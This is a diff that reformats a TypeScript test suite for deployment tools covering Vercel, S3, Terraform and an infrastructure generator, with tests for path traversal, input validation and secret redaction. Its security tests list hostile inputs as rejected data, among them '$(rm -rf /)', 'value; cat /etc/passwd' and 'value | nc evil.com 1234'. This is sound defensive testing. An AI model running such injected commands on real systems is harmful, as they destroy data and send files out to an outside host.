@@ -1,6 +1,6 @@
 /**
  * Deployment Tools Test Suite
- * 
+ *
  * Tests for Vercel, AWS S3, Terraform, and Infrastructure Generator tools.
  * Focuses on security, validation, and error handling.
  */
@@ -11,8 +11,12 @@ import * as path from 'path';
 // ─── Schema Validation Tests ─────────────────────────────────────────────────
 
 describe('Deployment Schema Validation', () => {
-  // Import schemas
-  const schemas = require('../schemas');
+  // Import schemas dynamically
+  let schemas: typeof import('../../tools/schemas');
+
+  beforeAll(async () => {
+    schemas = await import('../../tools/schemas');
+  });
 
   describe('VercelDeploySchema', () => {
     it('accepts valid input with defaults', () => {
@@ -35,7 +39,10 @@ describe('Deployment Schema Validation', () => {
       const input = { env: { NODE_ENV: 'production', API_KEY: 'secret' } };
       const result = schemas.VercelDeploySchema.safeParse(input);
       expect(result.success).toBe(true);
-      expect(result.data?.env).toEqual({ NODE_ENV: 'production', API_KEY: 'secret' });
+      expect(result.data?.env).toEqual({
+        NODE_ENV: 'production',
+        API_KEY: 'secret',
+      });
     });
   });
 
@@ -56,7 +63,7 @@ describe('Deployment Schema Validation', () => {
     });
 
     it('accepts CloudFront distribution ID', () => {
-      const input = { 
+      const input = {
         bucketName: 'my-bucket',
         cloudFrontDistributionId: 'E1234567890ABC',
       };
@@ -91,7 +98,10 @@ describe('Deployment Schema Validation', () => {
       };
       const result = schemas.TerraformPlanSchema.safeParse(input);
       expect(result.success).toBe(true);
-      expect(result.data?.vars).toEqual({ region: 'us-west-2', environment: 'staging' });
+      expect(result.data?.vars).toEqual({
+        region: 'us-west-2',
+        environment: 'staging',
+      });
     });
 
     it('accepts destroy plan', () => {
@@ -170,37 +180,45 @@ describe('Deployment Schema Validation', () => {
 // ─── Security Tests ──────────────────────────────────────────────────────────
 
 describe('Deployment Security', () => {
-  
   describe('Path Traversal Prevention', () => {
     it('should block directory traversal in Vercel deploy', async () => {
       // Mock the function since we can't actually run it
       const workspaceDir = '/workspace';
       const directory = '../../../etc';
-      
-      const resolvedPath = path.resolve(workspaceDir, directory.replace(/^[/\\]+/, ''));
+
+      const resolvedPath = path.resolve(
+        workspaceDir,
+        directory.replace(/^[/\\]+/, '')
+      );
       const isWithinWorkspace = resolvedPath.startsWith(workspaceDir);
-      
+
       expect(isWithinWorkspace).toBe(false);
     });
 
     it('should block directory traversal in AWS S3 deploy', async () => {
       const workspaceDir = '/workspace';
       const buildDir = '../../etc/passwd';
-      
+
       const projectDir = '/workspace/project';
-      const resolvedPath = path.resolve(projectDir, buildDir.replace(/^[/\\]+/, ''));
+      const resolvedPath = path.resolve(
+        projectDir,
+        buildDir.replace(/^[/\\]+/, '')
+      );
       const isWithinProject = resolvedPath.startsWith(projectDir);
-      
+
       expect(isWithinProject).toBe(false);
     });
 
     it('should block directory traversal in Terraform', async () => {
       const workspaceDir = '/workspace';
       const directory = '../../../home/user';
-      
-      const resolvedPath = path.resolve(workspaceDir, directory.replace(/^[/\\]+/, ''));
+
+      const resolvedPath = path.resolve(
+        workspaceDir,
+        directory.replace(/^[/\\]+/, '')
+      );
       const isWithinWorkspace = resolvedPath.startsWith(workspaceDir);
-      
+
       expect(isWithinWorkspace).toBe(false);
     });
   });
@@ -211,28 +229,30 @@ describe('Deployment Security', () => {
         'my-bucket',
         'bucket123',
         'a-b-c-123',
-        'aaa',  // minimum 3 chars
+        'aaa', // minimum 3 chars
       ];
-      
+
       const invalidBuckets = [
-        'a',        // too short
-        '-bucket',  // starts with hyphen
-        'bucket-',  // ends with hyphen
-        'BUCKET',   // uppercase
-        'my..bucket',  // consecutive periods
+        'a', // too short
+        '-bucket', // starts with hyphen
+        'bucket-', // ends with hyphen
+        'BUCKET', // uppercase
+        'my..bucket', // consecutive periods
       ];
-      
+
       const isValidBucketName = (name: string): boolean => {
-        return /^[a-z0-9][a-z0-9.-]{1,61}[a-z0-9]$/.test(name) && 
-               !name.includes('..') &&
-               !name.includes('.-') &&
-               !name.includes('-.');
+        return (
+          /^[a-z0-9][a-z0-9.-]{1,61}[a-z0-9]$/.test(name) &&
+          !name.includes('..') &&
+          !name.includes('.-') &&
+          !name.includes('-.')
+        );
       };
-      
+
       for (const bucket of validBuckets) {
         expect(isValidBucketName(bucket)).toBe(true);
       }
-      
+
       for (const bucket of invalidBuckets) {
         expect(isValidBucketName(bucket)).toBe(false);
       }
@@ -245,47 +265,39 @@ describe('Deployment Security', () => {
         'eu-west-1',
         'ap-southeast-2',
       ];
-      
-      const invalidRegions = [
-        'us_east_1',
-        'US-EAST-1',
-        'useast1',
-        'invalid',
-      ];
-      
+
+      const invalidRegions = ['us_east_1', 'US-EAST-1', 'useast1', 'invalid'];
+
       const isValidRegion = (region: string): boolean => {
         return /^[a-z]{2}-[a-z]+-\d+$/.test(region);
       };
-      
+
       for (const region of validRegions) {
         expect(isValidRegion(region)).toBe(true);
       }
-      
+
       for (const region of invalidRegions) {
         expect(isValidRegion(region)).toBe(false);
       }
     });
 
     it('should validate CloudFront distribution IDs', () => {
-      const validIds = [
-        'E1234567890ABC',
-        'EDFDVBD632BHDS5',
-      ];
-      
+      const validIds = ['E1234567890ABC', 'EDFDVBD632BHDS5'];
+
       const invalidIds = [
-        'e1234567890abc',  // lowercase
-        'E123-456',        // contains hyphen
+        'e1234567890abc', // lowercase
+        'E123-456', // contains hyphen
         '',
       ];
-      
+
       const isValidDistributionId = (id: string): boolean => {
         return /^[A-Z0-9]+$/.test(id);
       };
-      
+
       for (const id of validIds) {
         expect(isValidDistributionId(id)).toBe(true);
       }
-      
+
       for (const id of invalidIds) {
         expect(isValidDistributionId(id)).toBe(false);
       }
@@ -299,78 +311,69 @@ describe('Deployment Security', () => {
         'var-name',
         '_private',
       ];
-      
+
       const invalidNames = [
-        '123var',    // starts with number
-        '-var',      // starts with hyphen
-        'var name',  // contains space
-        'var;name',  // contains semicolon
+        '123var', // starts with number
+        '-var', // starts with hyphen
+        'var name', // contains space
+        'var;name', // contains semicolon
       ];
-      
+
       const isValidVarName = (name: string): boolean => {
         return /^[a-zA-Z_][a-zA-Z0-9_-]*$/.test(name);
       };
-      
+
       for (const name of validNames) {
         expect(isValidVarName(name)).toBe(true);
       }
-      
+
       for (const name of invalidNames) {
         expect(isValidVarName(name)).toBe(false);
       }
     });
 
     it('should block dangerous Terraform variable values', () => {
-      const safeValues = [
-        'production',
-        'us-east-1',
-        '123',
-        'my-app-v2',
-      ];
-      
+      const safeValues = ['production', 'us-east-1', '123', 'my-app-v2'];
+
       const dangerousValues = [
         '$(rm -rf /)',
         'value; cat /etc/passwd',
         'value | nc evil.com 1234',
         'value`whoami`',
-        '${var.secret}',  // prevent variable injection
+        '${var.secret}', // prevent variable injection
       ];
-      
+
       const isValidVarValue = (value: string): boolean => {
         const dangerous = /[;&|`$(){}[\]<>\\!]/;
         return !dangerous.test(value);
       };
-      
+
       for (const value of safeValues) {
         expect(isValidVarValue(value)).toBe(true);
       }
-      
+
       for (const value of dangerousValues) {
         expect(isValidVarValue(value)).toBe(false);
       }
     });
 
     it('should validate Vercel project names', () => {
-      const validNames = [
-        'my-app',
-        'project_123',
-        'MyProject',
-      ];
-      
+      const validNames = ['my-app', 'project_123', 'MyProject'];
+
       const invalidNames = [
-        'my app',        // space
-        'project/test',  // slash
-        'app<script>',   // XSS attempt
+        'my app', // space
+        'project/test', // slash
+        'app<script>', // XSS attempt
       ];
-      
+
       const isValidProjectName = (name: string): boolean => {
         return /^[a-zA-Z0-9_-]+$/.test(name);
       };
-      
+
       for (const name of validNames) {
         expect(isValidProjectName(name)).toBe(true);
       }
-      
+
       for (const name of invalidNames) {
         expect(isValidProjectName(name)).toBe(false);
       }
@@ -387,18 +390,18 @@ describe('Deployment Security', () => {
         /private_key\s*=\s*"[^"]+"/gi,
         /token\s*=\s*"[^"]+"/gi,
       ];
-      
+
       const testOutput = `
         password = "super_secret_123"
         api_key = "sk-1234567890abcdef"
         region = "us-east-1"
       `;
-      
+
       let filtered = testOutput;
       for (const pattern of sensitivePatterns) {
         filtered = filtered.replace(pattern, '[REDACTED]');
       }
-      
+
       expect(filtered).not.toContain('super_secret_123');
       expect(filtered).not.toContain('sk-1234567890abcdef');
       expect(filtered).toContain('region = "us-east-1"');
@@ -410,10 +413,10 @@ describe('Deployment Security', () => {
       // The tool should refuse to apply without either:
       // 1. A saved plan file
       // 2. Explicit autoApprove=true
-      
+
       const input = { directory: 'terraform' };
       // Without planFile and autoApprove=false, should require approval
-      
+
       const requiresApproval = !input.planFile && !input.autoApprove;
       expect(requiresApproval).toBe(true);
     });
@@ -430,7 +433,6 @@ describe('Deployment Security', () => {
 // ─── Infrastructure Generator Tests ──────────────────────────────────────────
 
 describe('Infrastructure Generator', () => {
-  
   describe('Resource Name Sanitization', () => {
     it('should sanitize project names for resource naming', () => {
       const sanitize = (name: string): string => {
@@ -441,12 +443,12 @@ describe('Infrastructure Generator', () => {
           .replace(/^-|-$/g, '')
           .slice(0, 63);
       };
-      
+
       expect(sanitize('My Project')).toBe('my-project');
       expect(sanitize('project@123!')).toBe('project-123');
       expect(sanitize('---test---')).toBe('test');
       expect(sanitize('UPPERCASE')).toBe('uppercase');
-      
+
       // Should truncate long names
       const longName = 'a'.repeat(100);
       expect(sanitize(longName).length).toBeLessThanOrEqual(63);
@@ -457,11 +459,11 @@ describe('Infrastructure Generator', () => {
     it('should detect React projects', () => {
       const mockPackageJson = {
         dependencies: {
-          'react': '^18.0.0',
+          react: '^18.0.0',
           'react-dom': '^18.0.0',
         },
       };
-      
+
       const deps = { ...mockPackageJson.dependencies };
       const isReact = !!deps['react'] || !!deps['react-dom'];
       expect(isReact).toBe(true);
@@ -470,11 +472,11 @@ describe('Infrastructure Generator', () => {
     it('should detect Next.js projects', () => {
       const mockPackageJson = {
         dependencies: {
-          'next': '^14.0.0',
-          'react': '^18.0.0',
+          next: '^14.0.0',
+          react: '^18.0.0',
         },
       };
-      
+
       const deps = { ...mockPackageJson.dependencies };
       const isNextjs = !!deps['next'];
       expect(isNextjs).toBe(true);
@@ -483,10 +485,10 @@ describe('Infrastructure Generator', () => {
     it('should detect Node.js API projects', () => {
       const mockPackageJson = {
         dependencies: {
-          'express': '^4.18.0',
+          express: '^4.18.0',
         },
       };
-      
+
       const deps = { ...mockPackageJson.dependencies };
       const isApi = !!deps['express'] || !!deps['fastify'] || !!deps['koa'];
       expect(isApi).toBe(true);
@@ -500,12 +502,12 @@ describe('Infrastructure Generator', () => {
         'main.tf',
         'variables.tf',
         's3.tf',
-        'cloudfront.tf',  // if CDN enabled
+        'cloudfront.tf', // if CDN enabled
         'outputs.tf',
         'terraform.tfvars.example',
         '.gitignore',
       ];
-      
+
       // Just verify the list is complete
       expect(expectedFiles).toContain('main.tf');
       expect(expectedFiles).toContain('s3.tf');
@@ -518,18 +520,13 @@ describe('Infrastructure Generator', () => {
         'lambda.tf',
         'outputs.tf',
       ];
-      
+
       expect(expectedFiles).toContain('lambda.tf');
     });
 
     it('should generate container resources', () => {
-      const expectedFiles = [
-        'main.tf',
-        'variables.tf',
-        'ecs.tf',
-        'outputs.tf',
-      ];
-      
+      const expectedFiles = ['main.tf', 'variables.tf', 'ecs.tf', 'outputs.tf'];
+
       expect(expectedFiles).toContain('ecs.tf');
     });
   });
@@ -538,7 +535,6 @@ describe('Infrastructure Generator', () => {
 // ─── Error Handling Tests ────────────────────────────────────────────────────
 
 describe('Deployment Error Handling', () => {
-  
   it('should handle missing credentials gracefully', () => {
     // Vercel without token
     const hasVercelToken = !!process.env.VERCEL_TOKEN;
@@ -556,12 +552,14 @@ describe('Deployment Error Handling', () => {
 
   it('should handle Terraform not installed', () => {
     // The tool should provide a helpful error message
-    const notInstalledError = 'Terraform is not installed. Please install it from https://www.terraform.io/downloads';
+    const notInstalledError =
+      'Terraform is not installed. Please install it from https://www.terraform.io/downloads';
     expect(notInstalledError).toContain('terraform.io');
   });
 
   it('should handle AWS CLI not installed', () => {
-    const notInstalledError = 'AWS CLI is not installed. Please install it from https://aws.amazon.com/cli/';
+    const notInstalledError =
+      'AWS CLI is not installed. Please install it from https://aws.amazon.com/cli/';
     expect(notInstalledError).toContain('aws.amazon.com');
   });
 });
@@ -569,11 +567,10 @@ describe('Deployment Error Handling', () => {
 // ─── Integration Tests (Mocked) ──────────────────────────────────────────────
 
 describe('Deployment Integration', () => {
-  
   describe('Tool Definition Completeness', () => {
-    it('should have all deployment tools defined', () => {
-      const { TOOL_DEFINITIONS } = require('../ToolExecutor');
-      
+    it('should have all deployment tools defined', async () => {
+      const { TOOL_DEFINITIONS } = await import('../ToolExecutor');
+
       const deploymentTools = [
         'deploy_netlify',
         'deploy_vercel',
@@ -585,9 +582,9 @@ describe('Deployment Integration', () => {
         'terraform_output',
         'generate_infrastructure',
       ];
-      
+
       const definedTools = TOOL_DEFINITIONS.map((t: any) => t.name);
-      
+
       for (const tool of deploymentTools) {
         expect(definedTools).toContain(tool);
       }
@@ -595,9 +592,9 @@ describe('Deployment Integration', () => {
   });
 
   describe('Schema Map Completeness', () => {
-    it('should have schemas for all deployment tools', () => {
-      const schemas = require('../schemas');
-      
+    it('should have schemas for all deployment tools', async () => {
+      const schemas = await import('../schemas');
+
       expect(schemas.VercelDeploySchema).toBeDefined();
       expect(schemas.AWSS3DeploySchema).toBeDefined();
       expect(schemas.TerraformInitSchema).toBeDefined();
@@ -620,7 +617,7 @@ describe('Deployment Integration', () => {
         'terraform_destroy',
         'generate_infrastructure',
       ];
-      
+
       // Verify these are in LONG_RUNNING_TOOLS
       // (would need to export and check)
       expect(deploymentTools.length).toBeGreaterThan(0);
@@ -631,24 +628,29 @@ describe('Deployment Integration', () => {
 // ─── Edge Cases ──────────────────────────────────────────────────────────────
 
 describe('Deployment Edge Cases', () => {
-  
   it('should handle empty workspace', () => {
     // An empty workspace should not crash
     const hasPackageJson = false;
     const hasTsConfig = false;
     const hasIndexHtml = false;
-    
+
     // Should default to 'unknown' type
-    const projectType = hasPackageJson ? 'detected' : 
-                       hasIndexHtml ? 'static' : 'unknown';
+    const projectType = hasPackageJson
+      ? 'detected'
+      : hasIndexHtml
+        ? 'static'
+        : 'unknown';
     expect(projectType).toBe('unknown');
   });
 
   it('should handle very long project names', () => {
     const sanitize = (name: string): string => {
-      return name.toLowerCase().replace(/[^a-z0-9-]/g, '-').slice(0, 63);
+      return name
+        .toLowerCase()
+        .replace(/[^a-z0-9-]/g, '-')
+        .slice(0, 63);
     };
-    
+
     const longName = 'a'.repeat(200);
     const sanitized = sanitize(longName);
     expect(sanitized.length).toBe(63);
@@ -657,11 +659,11 @@ describe('Deployment Edge Cases', () => {
   it('should handle special characters in file paths', () => {
     const paths = [
       'path/to/file.ts',
-      'path\\to\\file.ts',  // Windows
+      'path\\to\\file.ts', // Windows
       'path with spaces/file.ts',
       'path-with-dashes/file.ts',
     ];
-    
+
     // All should be handled without crashing
     for (const p of paths) {
       const normalized = p.replace(/\\/g, '/');
@@ -673,7 +675,7 @@ describe('Deployment Edge Cases', () => {
     // Each deployment should be independent
     const deployment1 = { id: '1', status: 'running' };
     const deployment2 = { id: '2', status: 'running' };
-    
+
     expect(deployment1.id).not.toBe(deployment2.id);
   });
 });
